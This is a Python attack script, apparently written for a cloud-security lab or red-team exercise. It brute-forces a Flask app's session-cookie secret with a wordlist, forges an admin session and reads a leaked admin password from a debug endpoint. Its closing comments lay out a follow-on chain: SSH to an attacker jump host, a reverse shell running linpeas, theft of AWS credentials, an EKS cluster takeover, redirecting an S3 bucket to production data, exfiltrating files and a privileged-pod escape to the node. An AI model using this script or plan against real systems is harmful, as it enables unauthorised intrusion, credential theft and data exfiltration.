#!/usr/bin/env python3.9

import requests
import subprocess
import flask_unsign
from flask_unsign.helpers import wordlist
import json

import argparse
from pathlib import Path

parser = argparse.ArgumentParser(description='reverse shell listener')
parser.add_argument('--host', dest='host', type=str,
                    help='target host')
parser.add_argument('--port', dest='port', type=int,
                    default=8000, help='target port')
parser.add_argument('--password-list', dest='password_list', type=str,
                    default="/tmp/passwords.txt", help='password list used in brute force')
parser.add_argument('--output-password-list', dest='output_password_list', type=str,
                    default="/tmp/hydra-passwords.txt", help='output password list - to be used by second stage')

args = parser.parse_args()

# URL of the Flask web server
webserver_url = f'http://{args.host}:{args.port}'

# Send a request to the Flask webserver and obtain the session cookie
s = requests.Session()
response = s.get(webserver_url)
if 'session' in s.cookies:
    session_cookie = s.cookies['session']
    print(f"Session cookie obtained: {session_cookie}")
else:
    raise ValueError("Session cookie not found in the response.")

# bruteforce secret
cookie_value = session_cookie
cookie_secret = ""
with open(args.password_list) as f:
    for word in f.read().splitlines():
        print(f"checking: {word}")
        verified = flask_unsign.verify(cookie_value, word)
        if verified:
            print(f"success: {word}")
            cookie_secret = word
            break
        else:
            print(f"failed: {word}")

kwargs = {
    'value': {'_fresh': True, '_id': 'booyah', '_user_id': '2', 'FEATURE_FLAG': 'ADMINPWD'},
    'secret': cookie_secret
}
print(f"setting up admin cookie: {kwargs}")
signed_cookie = flask_unsign.sign(**kwargs)
print(f"signed cookie: {signed_cookie}")

cookieCommonDict = {
    "domain": args.host,
    "path": "/",
    "secure": False,
    "version": 0,
}

s.cookies.set(name="session", value=signed_cookie, **cookieCommonDict)
r = s.get(f'{webserver_url}/debug/feature-status')
print(f"Response: {r.json()}")
feature = r.json()
admin_password = feature["Environment"]["Variable"]["FEATURE_FLAG"]
decoded_admin_password = bytes.fromhex(admin_password).decode('utf-8')

print(f"Discoverd password: {admin_password}")

print(f"Writing discovered password to: {args.output_password_list}")
with open(args.output_password_list, 'w') as f:
    f.write(admin_password)

# now we need to:
# - start an ssh session with this password to jumphost.attacker-hub.freedns.org
# - retrieve the private key from jump host
# - nmap scan to discover kubeadmin
# - ssh into kubeadmin using discovered password
# - run reverse shell
# - reverse shell executes linpeas and pulls back aws credentials
# - use credentials to call aws eks list-clusters and find our cluster
# - use credentials to call aws eks update-kubeconfig --name=<cluster>
# - run general kubernetes discovery (e.g. pierates)
# - discover s3app pod with directory listing
# - use same debug interface to grab BUCKET_NAME containing arn for s3 dev bucket (from secret)
# - list secrets to discovery BUCKET_NAME secret store
# - update BUCKET_NAME value to point to prod
# - list files in prod using updated pod (may need to rollout restart if reloader doesn't work here)
# - download sensitive files
# - optional
# - start privileged pod to mount node filesystem
# - start second reverse shell with nmap and linpeas.sh from node
# - exec into s3app to obtain a session for the role used in the pod
# - abuse this as necessary
